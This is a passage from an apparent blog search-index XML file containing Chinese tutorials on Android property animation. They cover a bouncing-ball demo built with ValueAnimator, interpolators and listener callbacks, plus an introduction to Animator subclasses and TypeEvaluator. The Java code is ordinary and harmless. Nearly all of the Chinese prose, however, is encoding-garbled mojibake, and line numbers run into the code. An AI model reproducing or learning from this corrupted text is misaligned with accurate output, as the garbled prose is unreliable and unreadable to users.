drawCircle()æ–¹æ³•ä¹Ÿéžå¸¸ç®€å•ï¼Œåªæ˜¯è°ƒç”¨canvasæä¾›çš„drawCircle()æ–¹æ³•æŒ‡å®šä½ç½®ä¸ŽåŠå¾„å’Œä¹‹å‰è®¾ç½®çš„paintï¼Œè°ƒç”¨åŽå°±ä¼šåœ¨å±å¹•ä¸Šçš„å¯¹åº”ä½ç½®ç»˜åˆ¶ä¸€ä¸ªå°çƒã€‚ ä¸‹è½åŠ¨ç”»çš„ç»˜åˆ¶ä¸‹é¢å°±è¦è®©å°çƒâ€œåŠ¨â€èµ·æ¥ï¼Œå…¶å®žå¹¶ä¸æ˜¯å°çƒå‘ç”Ÿäº†ç§»åŠ¨ï¼Œåªæ˜¯æˆ‘ä»¬ä¸åœåœ°æ”¹å˜å°çƒç»˜åˆ¶çš„ä½ç½®ï¼Œå½“ç»˜åˆ¶çš„é€ŸçŽ‡ï¼ˆå¸§çŽ‡ï¼‰å¤§äºŽ24å¸§æ—¶çš„ï¼Œå°±åœ¨è§†è§‰ä¸Šå˜æˆäº†æµç•…çš„åŠ¨ç”»ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨Animatorè¿žç»­åœ°æ”¹å˜å°çƒçš„ä½ç½®ï¼Œä¸ºäº†å®žçŽ°åŠ é€Ÿçš„æ•ˆæžœï¼Œä½ç½®çš„æ”¹å˜é€ŸçŽ‡åº”è¯¥éšæ—¶é—´å¢žåŠ ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æˆ‘ä»¬ä¸Šä¸€ç¯‡åšå®¢æåˆ°çš„Evaluatoræ¥å®žçŽ°ã€‚ animatorçš„åˆå§‹åŒ–123456789void init(int start, int end) &#123; animator = ValueAnimator.ofInt(start, end); animator.setDuration(1000); animator.setRepeatCount(ValueAnimator.INFINITE); animator.setRepeatMode(ValueAnimator.RESTART); animator.setInterpolator(new AccelerateInterpolator(rate)); animator.addUpdateListener(this); animator.addListener(this);&#125; å†™æˆä¸€ä¸ªåˆå§‹åŒ–æ–¹æ³•ä¾¿äºŽé‡æ–°åˆå§‹åŒ–ã€‚ ç¬¬2è¡Œå°†ä¼ å…¥çš„å€¼åŒºé—´çš„å¼€å§‹ä¸Žç»“æŸå€¼ä½œä¸ºå‚æ•°èŽ·å¾—äº†ä¸€ä¸ªå€¼ä¸ºintçš„ValueAnimatorã€‚ ç¬¬3è¡Œè®¾ç½®äº†åŠ¨ç”»çš„æ—¶é—´ä¸º1ç§’ã€‚ ç¬¬4ã€5è¡Œåˆ†åˆ«è®¾ç½®äº†åŠ¨ç”»çš„é‡å¤æ¬¡æ•°ä¸ºæ— é™æ¬¡ï¼Œé‡å¤æ¨¡å¼ä¸ºé‡æ–°å¼€å§‹ï¼Œé¡¾åæ€ä¹‰ï¼ŒåŠ¨ç”»å¯ä»¥é‡å¤è¿›è¡Œï¼Œé‡æ–°å¼€å§‹çš„é‡å¤æ¨¡å¼æ„å‘³ç€ä¸€æ¬¡åŠ¨ç”»ç»“æŸä¹‹åŽæ•°å€¼é‡æ–°ä»Žstartåˆ°endè¿›è¡Œæ”¹å˜ï¼Œä¹Ÿå¯ä»¥è®¾ç½®é‡å¤çš„æ¨¡å¼ä¸ºåå‘ï¼Œå³ä¸€æ¬¡åŠ¨ç”»ç»“æŸä¹‹åŽæ•°å€¼ä»Žendåˆ°startå˜åŒ–ã€‚ ç¬¬å…­è¡Œä¸ºanimatorè®¾ç½®äº†ä¸€ä¸ªåº“ä¸­æä¾›çš„AccelerateInterpolatorå³åŠ é€Ÿæ’å€¼å™¨ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å®žçŽ°åŠ é€Ÿæ•ˆæžœçš„å…³é”®ï¼Œä¸Šç¯‡ä¹‹ä¸­å·²ç»çœ‹è¿‡å®ƒçš„æºç ï¼Œé»˜è®¤æ—¶è¿”å›žçš„æœ€ç»ˆåŠ¨ç”»è¿›è¡Œç™¾åˆ†æ¯”æ˜¯æ—¶é—´ç™¾åˆ†æ¯”çš„å¹³æ–¹ï¼Œè¾¾åˆ°äº†ä½ç½®éšç€æ—¶é—´çš„å¹³æ–¹å˜åŒ–ï¼Œä¹Ÿå°±æ˜¯å®žçŽ°äº†åŠ é€Ÿä¸‹è½çš„æ•ˆæžœã€‚ ç¬¬7ã€8ä¸¤è¡Œåˆ†åˆ«ä¸ºanimatorè®¾ç½®äº†ä¸€ä¸ªUpdateListenerç”¨äºŽç›‘å¬æ•°å€¼å˜åŒ–ï¼Œä¸€ä¸ªListenerç”¨äºŽç›‘å¬animatoræœ¬èº«å¼€å§‹ã€åœæ­¢ã€é‡å¤ã€‚ å®Œæˆä¸‹è½åŠ¨ç”»åˆ›å»ºå¥½äº†ValueAnimatorï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åœ¨é€‚åˆçš„æ—¶å€™åœ¨ç”»å¸ƒä¸Šé‡æ–°ç»˜åˆ¶ä½ç½®å‚æ•°è¢«animatoræ”¹å˜åŽçš„å°çƒã€‚æ³¨æ„åˆ°æˆ‘ä»¬ä¹‹å‰å°çƒçš„yåæ ‡å­˜å‚¨åœ¨yPoså˜é‡ä¸­ï¼Œæˆ‘ä»¬åªè¦é€‚æ—¶ä»¤yPosç­‰äºŽæ”¹å˜åŽçš„å€¼å†é€šè¿‡invalidate()æ–¹æ³•è¿›å…¥onDraw()æ–¹æ³•è®©ViewæŒ‰å°çƒçš„å‚æ•°é‡æ–°è¿›è¡Œç»˜åˆ¶å°±å¯ä»¥äº†ã€‚ animatorçš„ValueAnimator.AnimatorUpdateListenerä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªåŠæ—¶åˆ·æ–°Viewçš„æ—¶æœºï¼Œä¹‹å‰ä¸ºanimatoræ³¨å†Œä¸€ä¸ªUpdateListenerä¹‹åŽï¼Œæ¯å½“animatorçš„å€¼å‘ç”Ÿæ”¹å˜æ—¶ï¼ŒonAniamtionUpdate()å°±ä¼šè¢«å›žè°ƒã€‚ é‚£æˆ‘ä»¬å°±å¯ä»¥åœ¨è¿™ä¸ªå›žè°ƒæ–¹æ³•ä¸­ä¸ºyPosè®¾ç½®æ–°çš„å€¼å¹¶ä»¤Viewé‡æ–°ç»˜åˆ¶ï¼š 12345@Overridepublic void onAnimationUpdate(ValueAnimator animation) &#123; yPos = (int) animation.getAnimatedValue(); invalidate();&#125; è¿™æ ·ï¼Œæˆ‘ä»¬åªè¦å¯åŠ¨animatorä»¤å®ƒçš„å€¼å¼€å§‹å˜åŒ–ï¼Œå°±ä¼šä¸æ–­åœ°è°ƒç”¨onAnimationUpdate()é‡ç»˜Viewï¼š 123456@Overridepublic void onClick(View v) &#123; init(radius, canvasHeight); animationHeight = canvasHeight + radius; animator.start();&#125; start()æ–¹æ³•ä»¤animatorå¼€å§‹ã€‚ åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥çœ‹åˆ°ç‚¹å‡»å±å¹•åŽå°çƒä¸‹è½åˆ°åº•éƒ¨å¹¶åœæ­¢çš„æ•ˆæžœã€‚ å›žå¼¹æ•ˆæžœå®žçŽ°æˆ‘ä»¬ä¹‹å‰å·²ç»ä¸ºanimatorè®¾ç½®äº†æ— é™é‡å¤ï¼Œå¹¶ä¸”æ¨¡å¼ä¸ºé‡æ–°å¼€å§‹ï¼Œé‚£ä¹ˆè¦åšåˆ°å›žå¼¹çš„æ•ˆæžœï¼Œå°±è¦åœ¨å°çƒè½åˆ°åº•è¾¹ï¼ˆåŠ¨ç”»å®Œæˆï¼‰ä¹‹åŽï¼Œä¸ºå°çƒè®¾ç½®æ–°çš„åˆå§‹å€¼ä¸Žæœ€ç»ˆå€¼ï¼Œè®©å°çƒä»Žæœ€ä½Žç‚¹å›žåˆ°è½ä¸‹æ—¶ä¸€åŠçš„é«˜åº¦ã€‚é«˜åº¦æ•°æ®æˆ‘ä»¬åœ¨onClick()ä¸­çš„ç¬¬4è¡Œï¼ˆä¸Šé¢ä»£ç ï¼‰å·²ç»åˆå§‹åŒ–ä¸ºäº†ç›¸å¯¹äºŽç”»å¸ƒçš„é«˜åº¦ï¼Œä¹‹åŽå†ä½¿ç”¨æ—¶åªéœ€æŠŠå®ƒé™¤2å°±å¯ä»¥è¡¨ç¤ºåœ†å¿ƒè·åº•è¾¹çš„é«˜åº¦äº†ã€‚ Animator.AnimatorListenerä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—æ–¹æ³•ç”¨äºŽç›‘å¬animatorçŠ¶æ€çš„å˜åŒ–ï¼ˆè€Œä¸æ˜¯æ•°å€¼ï¼‰ï¼š ï¼ˆé™¤é‡‘è‰²ä¸ºAndroid 8æ–°å¢žå¤–ï¼‰ä¾æ¬¡ä¸ºåŠ¨ç”»å–æ¶ˆï¼ŒåŠ¨ç”»ç»“æŸï¼ŒåŠ¨ç”»å¼€å§‹é‡å¤ï¼ŒåŠ¨ç”»å¼€å§‹ã€‚ è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦åœ¨onAnimationReapt()å›žè°ƒä¸­ä¸ºåŠ¨ç”»è®¾ç½®æ–°çš„åˆå€¼ä¸Žç»“æŸæ•°å€¼ï¼š 123456789101112131415@Overridepublic void onAnimationRepeat(Animator animation) &#123; ValueAnimator vAnimation = (ValueAnimator) animation; if (isDown) &#123; animationHeight = (int) (animationHeight * 0.5); &#125; isDown = !isDown; if (isDown) &#123; vAnimation.setIntValues(canvasHeight - animationHeight, canvasHeight); vAnimation.setInterpolator(new AccelerateInterpolator()); &#125; else &#123; vAnimation.setIntValues(canvasHeight, canvasHeight - animationHeight); vAnimation.setInterpolator(new DecelerateInterpolator()); &#125;&#125; å›žè°ƒå‚æ•°ä¸­çš„animationå°±æ˜¯å›žè°ƒè¿™ä¸ªå‡½æ•°çš„animatorï¼Œç¬¬3è¡Œå¯¹å…¶è¿›è¡Œä¸€ä¸ªç±»åž‹è½¬æ¢ã€‚ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªisDownå‚æ•°æ¥åˆ¤æ–­æ˜¯å¦æ˜¯ä¸‹è½è¿‡ç¨‹ï¼Œå¦‚æžœä¸Šä¸ªåŠ¨ç”»æ˜¯ä¸‹è½è¿‡ç¨‹ï¼Œå°±å°†animationHeightå‡åŠã€‚ ç¬¬7è¡ŒæŠŠisDownç½®åï¼Œå†æ ¹æ®isDownçš„åˆ¤æ–­ä½¿ç”¨setIntValues()æ–¹æ³•ä¸ºanimatorè®¾ç½®æ–°çš„èŒƒå›´ï¼Œä½¿ç”¨setInterpolator()æ–¹æ³•è®¾ç½®æ–°çš„æ’å€¼å™¨ï¼Œæ³¨æ„ä¸Šå‡æ—¶ä½¿ç”¨çš„åº”è¯¥æ˜¯DecelerateInterpolaterå‡é€Ÿä¸Šå‡ã€‚ è¿™æ ·åœ¨æ–°çš„åŠ¨ç”»å¼€å§‹æ—¶å±žæ€§æ”¹å˜çš„èŒƒå›´å°±å¾—åˆ°äº†æ”¹å˜ï¼Œä¹Ÿå°±ä½¿å¾—å°çƒå¯ä»¥åå¼¹äº†ã€‚ ä¸ºäº†è®©æ¯ä¸€æ¬¡ç‚¹å‡»æ—¶åŠ¨ç”»éƒ½å¯ä»¥é‡æ–°å¼€å§‹ï¼Œåœ¨onClick()æ–¹æ³•ä¸­åŠ å…¥å‡ è¡Œåˆå§‹åŒ–ä»£ç ï¼š 12345678910@Overridepublic void onClick(View v) &#123; if (animator != null) &#123; animator.end(); &#125; init(radius, canvasHeight); animationHeight = canvasHeight + radius; isDown = true; animator.start();&#125; è¿™é‡Œç¬¬3-5è¡Œè®©å¦‚æžœå­˜åœ¨çš„animatoråœæ­¢ï¼Œå¦åˆ™æ–°åŠ¨ç”»æ— æ³•å¯åŠ¨ã€‚ ä¸‹ç¯‡åšå®¢å°†ä¼šä»Žæºç è§’åº¦ç»§ç»­æŽ¢ç´¢animatorçš„å®žçŽ°åŽŸç†å’Œæ›´é«˜çº§çš„ä¸€äº›ç‰¹æ€§ã€‚ GitHubå®Œæ•´ä»£ç ]]></content>
      <categories>
        <category>Android</category>
        <category>UI</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>UI</tag>
        <tag>Animation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android PropertyAnimation å±žæ€§åŠ¨ç”»ï¼ˆä¸€ï¼‰åˆæŽ¢]]></title>
    <url>%2F2017%2F03%2F26%2Fandroid_property_animation_1%2F</url>
    <content type="text"><![CDATA[å‰è¨€ç›¸å¯¹äºŽé™æ€çš„é¡µé¢ï¼ŒåŠ¨ç”»å¾€å¾€èƒ½æ›´ç›´è§‚åœ°è¡¨è¾¾æ‰€éœ€çš„ä¿¡æ¯ï¼Œåœ¨UIå¼€å‘è¿‡ç¨‹ä¸­èµ·ç€ç›¸å½“å¤§çš„ä½œç”¨ã€‚ Androidä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—å®žçŽ°åŠ¨ç”»æ•ˆæžœçš„æ–¹æ³•ï¼ŒPropertyAnimaitonæ˜¯æœ€å¸¸è§ä¹Ÿæ˜¯æœ€å®žç”¨çš„ä¸€ç§ï¼Œå¦‚åŒå®ƒçš„åå­—ä¸€æ ·ï¼Œå®ƒçš„å®žçŽ°æ–¹å¼æ˜¯é€šè¿‡æ”¹å˜å¯¹è±¡çš„ä¸€ç³»åˆ—å±žæ€§å€¼æ¥æ”¹å˜å¯¹è±¡çš„çŠ¶æ€ï¼Œ ä¾‹å¦‚åŠ¨æ€åœ°æ”¹å˜ç»˜åˆ¶çš„ä½ç½®å°±å¯ä»¥å®žçŽ°ç»˜åˆ¶ç‰©ä½“çš„ç§»åŠ¨æ•ˆæžœï¼ŒåŠ¨æ€åœ°æ”¹å˜å¯¹è±¡çš„æ˜¾ç¤ºçŠ¶æ€å¯ä»¥å®žçŽ°é—ªçƒæ•ˆæžœã€‚ Animatoræ¦‚è§ˆAndroidæä¾›çš„å®žçŽ°å±žæ€§åŠ¨ç”»çš„å·¥å…·æ˜¯android.animation.Animatorè¿™ä¸ªç±»ï¼Œå®ƒçš„ä½¿ç”¨éœ€è¦é…åˆanimationåŒ…ä¸‹çš„å…¶ä»–å·¥å…·ç±»ï¼Œè¿™ä¸ªç±»çš„åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬è¦å¦‚ä½•ä½¿ç”¨å®ƒæ¥å®žçŽ°å±žæ€§åŠ¨ç”»å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥å°†Animatorç†è§£ä¸ºAndroidä¸ºæˆ‘ä»¬æä¾›çš„ä¸€ä¸ªæŒ‰æˆ‘ä»¬çš„éœ€è¦åœ¨ä¸€å®šæ—¶é—´æ®µå†…è¿žç»­åœ°è®¡ç®—å¹¶è¿”å›žå€¼çš„å·¥å…·ï¼Œè¿™ä¸ªå€¼å¯ä»¥æ˜¯é€šç”¨çš„æ•´åž‹ã€æµ®ç‚¹åž‹ï¼Œä¹Ÿå¯ä»¥æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»åž‹ã€‚ æˆ‘ä»¬å¯ä»¥è®¾ç½®è¿”å›žå€¼çš„èŒƒå›´ï¼Œå¹¶å¯ä»¥æŽ§åˆ¶å€¼å˜åŒ–çš„å¿«æ…¢ï¼Œä¾‹å¦‚å®žçŽ°è‡ªç”±è½ä½“ä¸‹è½çš„ç‰©ä½“æ—¶æˆ‘ä»¬éœ€è¦è®©é«˜åº¦å€¼ä»¥ä¸€ä¸ªè¶Šæ¥è¶Šå¿«çš„é€Ÿåº¦é™ä½Žã€‚ è¿™é‡Œçš„è¿žç»­éœ€è¦æ³¨æ„ï¼Œå®žé™…ä¸Šæ˜¯ä¸å¯èƒ½äº§ç”ŸçœŸæ­£æ„ä¹‰ä¸Šçš„è¿žç»­å€¼çš„ï¼Œä½†æ˜¯å¦‚æžœåœ¨ç»˜åˆ¶è¿‡ç¨‹ä¸­è®¡ç®—è¿™ä¸ªå€¼çš„é€Ÿåº¦å°äºŽç»˜åˆ¶ä¸€å¸§æ‰€éœ€è¦çš„æ—¶é—´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨è§†è§‰ä¸Šè®¤ä¸ºè¿™ä¸ªå€¼æ˜¯åœ¨è¿žç»­æ”¹å˜çš„ã€‚è¿™ä¸€ç‚¹ä¹Ÿæ˜¯ç†è§£å…¶ä½œç”¨çš„å…³é”®ï¼šæˆ‘ä»¬å¾ˆéš¾åŽ»å†™å‡ºä¸€ä¸ªå¯ä»¥éšæ—¶èŽ·å–è¿žç»­å€¼çš„å·¥å…·ï¼Œè€ŒAnimatoræ­£æ˜¯ä¸€ä¸ªæ»¡è¶³æˆ‘ä»¬è¿™ä¸ªéœ€æ±‚çš„ä¸€ä¸ªé€šç”¨å·¥å…·ã€‚ é€šè¿‡å°†Animatorä¸ŽViewçš„ç»˜åˆ¶è¿‡ç¨‹ç»“åˆï¼Œå°±å¯ä»¥å®žçŽ°ç»å¤§å¤šæ•°çš„åŠ¨ç”»æ•ˆæžœï¼Œ ä½†æ˜¯Animatorä¹Ÿä¸åªå±€é™åœ¨ä½¿ç”¨åœ¨ç»˜åˆ¶åŠ¨ç”»ï¼Œåªè¦æ˜¯æœ‰ç›¸ä¼¼éœ€æ±‚çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å®ƒæ¥å®žçŽ°ï¼Œ åŒæ—¶ç”±äºŽå±žæ€§åŠ¨ç”»åªé’ˆå¯¹å±žæ€§è¿›è¡Œä¿®æ”¹ï¼Œä¸Žè¢«ä¿®æ”¹å¯¹è±¡ä¹‹å‰å‡ ä¹Žæ²¡æœ‰è€¦åˆï¼Œä¸éœ€è¦å¯¹è¢«ä¿®æ”¹å¯¹è±¡ä½œå‡ºæ”¹å˜ï¼Œå¯ä»¥è®¾ç½®æ–¹å¼ä¹Ÿå¤šç§å¤šæ ·ï¼Œè¿™äº›éƒ½æ˜¯åŠ¨ç”»çš„å¦ä¸€ç§å®žçŽ°æ–¹æ³•ViewAnimatoræ‰€æ— æ³•åšåˆ°çš„ï¼Œæ‰€ä»¥æˆ‘å±žæ€§åŠ¨ç”»æ˜¯çŽ°åœ¨å®žçŽ°åŠ¨ç”»æ•ˆæžœçš„æ™®éåšæ³•ã€‚ ä½¿ç”¨AnimatorAnimatorå­ç±»ä¸‹é¢å°±æ¥çœ‹çœ‹å¦‚ä½•ä½¿ç”¨Animatoræ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ æˆ‘ä»¬ä½¿ç”¨Animatorå¯ä»¥åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼Œä¸€æ˜¯è¿›è¡Œæ•°å€¼çš„è®¡ç®—ï¼ŒäºŒæ˜¯å°†è®¡ç®—å‡ºçš„æ•°å€¼è®¾ç½®åˆ°å¯¹åº”çš„å¯¹è±¡ä¸Šã€‚è€ŒAnimatoræœ‰ç€ä¸‰ä¸ªå­ç±»ï¼šValueAnimator ObjectAnimator AnimatorSetã€‚ ValueAnimatorå®žçŽ°äº†ä¸Šè¿°è¿‡ç¨‹çš„ç¬¬ä¸€ä¸ªæ­¥éª¤ï¼šè¿›è¡Œæ•°å€¼çš„è®¡ç®—ã€‚ç¬¬äºŒä¸ªæ­¥éª¤åˆ™éœ€è¦æˆ‘ä»¬é‡å†™å®ƒçš„å›žè°ƒåœ¨å€¼å‘ç”Ÿæ”¹å˜æ—¶å€™æ‰‹åŠ¨åœ°ä¸ºå¯¹è±¡æ›´æ–°å±žæ€§å€¼ã€‚ ObjectAnimatoråˆ™åœ¨å…¶åŸºç¡€ä¸Šè¿›è¡Œäº†è¿›ä¸€æ­¥çš„å°è£…ï¼ŒåŠ å…¥äº†ä¸€äº›æ–¹æ³•ä½¿å¾—å®ƒå¯ä»¥ç»‘å®šä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æ•°å€¼æ”¹å˜çš„åŒæ—¶å¯¹å¯¹è±¡çš„å±žæ€§è¿›è¡Œæ›´æ–°ã€‚ AnimatorSetå¯ä»¥å¯¹Animatorè¿›è¡Œç»„åˆï¼Œè®©å®ƒä»¬ä¹‹é—´è¿›è¡Œè”åŠ¨ï¼Œä¾‹å¦‚å¯ä»¥è®¾ç½®ä¸€ä¸ªåŠ¨ç”»æ ¹æ®å¦ä¸€ä¸ªåŠ¨ç”»çš„çŠ¶æ€æ¥å†³å®šæ˜¯å¦å¼€å§‹ã€æš‚åœæˆ–åœæ­¢ã€‚ å¯ä»¥çœ‹åˆ°ï¼ŒValueAnimatoræä¾›äº†ä¸€ä¸ªAnimatoræœ€æ ¸å¿ƒçš„å†…å®¹ï¼Œä¹Ÿæ˜¯ä½¿ç”¨ä¸­æœ€ä¸ºçµæ´»çš„ä¸€ä¸ªã€‚ObjectAnimatorç”±äºŽç»‘å®šäº†ç›¸åº”çš„å¯¹è±¡ï¼Œåœ¨ä½¿ç”¨ä¸Šä¼šå—ä¸€äº›é™åˆ¶ã€‚AnimatorSetä¸“ç”¨äºŽéœ€è¦ç»„åˆåŠ¨ç”»çš„åœºæ™¯ã€‚ ValueAnimatoråœ¨è¿™ç¯‡åšå®¢ä¸­ï¼Œæˆ‘ä»¬å…³æ³¨æœ€ä¸ºæ ¸å¿ƒçš„ValueAnimatorã€‚ å…³é”®å±žæ€§ValueAnimatorå¯¹è±¡å†…éƒ¨ç»´æŠ¤äº†ä¸€ç³»åˆ—å±žæ€§æ¥ä¿å­˜æ‰€éœ€çš„å„ç§ä¿¡æ¯ã€‚ Durationï¼šåŠ¨ç”»çš„æŒç»­æ—¶é—´ï¼Œé€šè¿‡setDuration()æ–¹æ³•è®¾ç½® Repeat count and behaviorï¼šé‡å¤è®¡æ•°ä¸Žé‡å¤æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®è¿™ä¸¤ä¸ªå±žæ€§æ¥æŽ§åˆ¶åŠ¨ç”»æ˜¯å¦é‡å¤ä»¥åŠé‡å¤çš„æ¬¡æ•°ï¼Œé€šè¿‡setRepeatCount()ä¸ŽsetRepeatMode()æ–¹æ³•è®¾ç½® Frame refresh delayï¼šå¸§åˆ·æ–°å»¶è¿Ÿï¼Œä¹Ÿå°±æ˜¯è®¡ç®—ä¸¤å¸§åŠ¨ç”»ä¹‹é—´çš„é—´éš”æ—¶é—´ï¼Œä½†è¿™ä¸ªæ—¶é—´åªæ˜¯Animatorå°½åŠ›åŽ»ä¿æŒçš„å€¼ï¼Œå…·ä½“çš„é—´éš”æ—¶é—´ä¼šç”±äºŽç³»ç»Ÿè´Ÿè½½ä¸Žæ€§èƒ½çš„ä¸åŒè€Œä¸åŒï¼ŒåŒæ—¶è®¾ç½®å®ƒçš„æ–¹æ³•ä¸ºä¸€ä¸ªé™æ€æ–¹æ³•ï¼šValueAnimator.setFrameDelay()ï¼Œä¼šè¢«è®¾ç½®åˆ°æ‰€æœ‰çš„Animatorä¸Šï¼Œè¿™æ˜¯å› ä¸ºè¿™äº›Animatoréƒ½åœ¨åŒä¸€ä¸ªæ—¶é—´å¾ªçŽ¯ä¸­ã€‚è¿™ä¸ªå±žæ€§ä¹Ÿæœ‰å¯èƒ½ä¼šè¢«å¿½ç•¥å¦‚æžœåŠ¨ç”»ç³»ç»Ÿé‡‡ç”¨äº†å†…éƒ¨çš„è®¡æ—¶æ¥æºï¼Œä¾‹å¦‚vsyncæ¥è®¡ç®—å±žæ€§ã€‚åŒæ—¶è¿™ä¸ªæ–¹æ³•éœ€è¦åœ¨ä¸Žstart()æ–¹æ³•ç›¸åŒçš„è¿›ç¨‹ä¸­è°ƒç”¨ Time interpolationï¼šæ—¶é—´æ’å€¼å™¨ï¼Œæ˜¯æˆ‘ä»¬å®žçŽ°ä¸åŒåŠ¨ç”»æ•ˆæžœçš„å…³é”®ï¼Œæ¯ä¸€æ—¶åˆ»æ‰€è¿”å›žçš„æ•°å€¼ç”±å®ƒå†³å®šï¼ŒåŽæ–‡ä¼šè¯¦ç»†è®² åˆå§‹åŒ–ä¸ŽTypeEvaluatorValueAnimatorå¯¹è±¡çš„æž„é€ å‡½æ•°åªç”±å†…éƒ¨ä½¿ç”¨ï¼ŒèŽ·å–ValueAnimatorå¯¹è±¡çš„æ–¹æ³•æ˜¯è°ƒç”¨å®ƒçš„å·¥åŽ‚æ–¹æ³•ï¼š ValueAnimator.ofArgb() ValueAnimator.ofInt() ValueAnimator.ofFloat() ValueAnimator.ofObject() ValueAnimator.ofPropertyValuesHolder() //æœ¬ç¯‡æœªæ¶‰åŠï¼Œä¸‹ä¸€ç¯‡è¿›è¡Œè®²è§£ å‰ä¸‰ä¸ªå¯ä»¥çœ‹ä½œæ˜¯ValueAnimatorä¸ºæˆ‘ä»¬æä¾›çš„åˆå§‹åŒ–æ–¹å¼ï¼Œå®ƒä»¬çš„å‚æ•°éƒ½æ˜¯å¯¹åº”ç±»åž‹çš„é•¿åº¦å¯å˜å‚æ•°:(Type ...values)ï¼Œæˆ‘ä»¬éœ€è¦æä¾›ä¸€ä¸ªä»¥ä¸Šçš„å‚æ•°ï¼ŒValueAnimatoræœ€ç»ˆæä¾›çš„å€¼ä¼šåœ¨è¿™äº›å€¼ä¹‹å‰å˜åŠ¨ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹è¿™é‡Œæä¾›çš„Argbï¼ˆç”¨äºŽé¢œè‰²å€¼çš„å˜åŒ–ï¼‰å’Œæ•´åž‹ã€æµ®ç‚¹å€¼åŸºæœ¬å¯ä»¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œä½†æ˜¯æŸäº›æ—¶å€™æˆ‘ä»¬éœ€è¦ç»“æžœæ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ä¸€äº›å¯¹è±¡ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°TypeEvaluator&lt;&gt;æŽ¥å£äº†ï¼Œä¸Žè¿™ä¸ªæŽ¥å£å¯¹åº”çš„å·¥åŽ‚æ–¹æ³•æ˜¯ValueAnimator.ofObject()ï¼š 12ValueAnimator ofObject (TypeEvaluator evaluator, Object... values) è¿™é‡Œçš„å¯å˜å‚æ•°ç±»åž‹å˜ä¸ºäº†Objectï¼ŒåŒæ—¶è¿˜éœ€è¦æˆ‘ä»¬æä¾›ä¸€ä¸ªTypeEvaluator&lt;&gt;ï¼Œç”¨äºŽâ€œå‘Šè¯‰â€Animatorå¦‚ä½•è¿”å›žè¿™ä¸ªObjectå€¼ã€‚ TypeEvaluator&lt;&gt;æŽ¥å£å¹¶ä¸å¤æ‚ï¼Œåªæœ‰ä¸€ä¸ªæ–¹æ³•éœ€è¦æˆ‘ä»¬é‡å†™ï¼š 123T evaluate (float fraction, T startValue, T endValue) startValueä¸ŽendValueéžå¸¸å¥½ç†è§£ï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨èŽ·å–Animatoræ—¶æŒ‡å®šçš„å€¼çš„èµ·å§‹å€¼å’Œç»“æŸå€¼ã€‚ç±»åž‹ä¸Žè¿”å›žç±»åž‹ä¸€è‡´ï¼Œå½“ç„¶éƒ½æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»åž‹ã€‚ è¿™é‡Œçš„fractionå°±æ˜¯å†³å®šæˆ‘ä»¬æœ€ç»ˆè¿”å›žå€¼çš„å…³é”®å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªfractionç†è§£ä¸ºanimatoræä¾›ç»™æˆ‘ä»¬çš„æœ€ç»ˆçš„æ•°å€¼æ”¹å˜çš„æ¯”ä¾‹ï¼Œä»¥å°æ•°è¡¨ç¤ºï¼Œå°äºŽ0è¡¨ç¤ºä½ŽäºŽstartValueï¼Œå¤§äºŽ0è¡¨ç¤ºè¶…å‡ºendValueï¼Œ0-1ä¹‹é—´è¡¨ç¤ºåœ¨startValueä¸ŽendValueä¹‹é—´ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠè¿™ä¸ªå€¼è½¬æ¢ä¸ºåœ¨èµ·å§‹å’Œç»“æžœèŒƒå›´ä¹‹é—´çš„åˆé€‚çš„å¯¹è±¡å€¼ã€‚ ä¾‹å¦‚ï¼Œå¯¹äºŽåŸºæœ¬çš„æµ®ç‚¹ç±»åž‹ï¼Œé»˜è®¤çš„FloatEvaluatoræ˜¯è¿™æ ·çš„ï¼š 1234public Float evaluate(float fraction, Number startValue, Number endValue) &#123; float startFloat = startValue.floatValue(); return startFloat + fraction * (endValue.floatValue() - startFloat);&#125; å¯ä»¥çœ‹åˆ°ï¼Œå°±æ˜¯ç›¸å½“äºŽæŠŠfractionæ‰€è¡¨ç¤ºçš„æ¯”ä¾‹â€œæŠ•å°„â€åˆ°äº†æˆ‘ä»¬æ‰€éœ€è¦çš„æ•°æ®å¯¹è±¡ä¸Šï¼Œè¿™é‡Œæ˜¯æµ®ç‚¹ç±»åž‹ã€‚å¦‚æžœä½¿ç”¨æˆ‘ä»¬çš„è‡ªå®šä¹‰ç±»åž‹ï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºè‡ªå·±çš„ç±»åž‹å®šä¹‰è¿™æ ·çš„æ“ä½œã€‚ æ³¨æ„ï¼šè¿™é‡Œè¦æ±‚æˆ‘ä»¬å¿…é¡»å°†fractionçº¿æ€§åœ°ååº”åˆ°å¯¹åº”çš„ç±»åž‹ä¸Šï¼Œå› ä¸ºfractionåæ˜ 